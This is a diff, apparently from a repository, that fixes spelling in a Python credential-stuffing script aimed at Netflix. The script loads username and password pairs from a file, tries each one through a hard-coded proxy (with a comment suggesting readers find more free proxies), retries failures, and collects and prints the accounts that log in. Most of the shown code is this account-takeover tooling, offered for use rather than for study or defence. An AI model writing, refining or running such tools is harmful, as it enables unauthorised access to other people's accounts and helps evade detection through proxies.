@@ -3,12 +3,12 @@ import time
 import Netflix
 import Extractor
 
-successful_logins = [] #to store successfull logins
+successful_logins = [] #to store successful logins
 credentials = Extractor.extract_credentials("data.txt") #file path should be correct , current file is in root dir
 proxy_server = "170.187.232.112:80" #example of proxy server, you can google for another free proxy servers
 
 ######################################
-##        MAIN Progame Starts       ##
+##        MAIN Program Starts       ##
 ######################################
 
 count = 0 #count to store how many credentials are attempted
@@ -43,7 +43,7 @@ while credentials:
                 print("Max retries reached. Moving to the next credential.")
 
 ######################################
-##        Print Successfulls        ##
+##        Print Successfully        ##
 ######################################
 
 if successful_logins:
@@ -54,6 +54,6 @@ else:
     print("No successful logins.")
 
 ######################################
-##        MAIN Progame Ends         ##
+##        MAIN Program Ends         ##
 ######################################
 print("Count completed:", count)
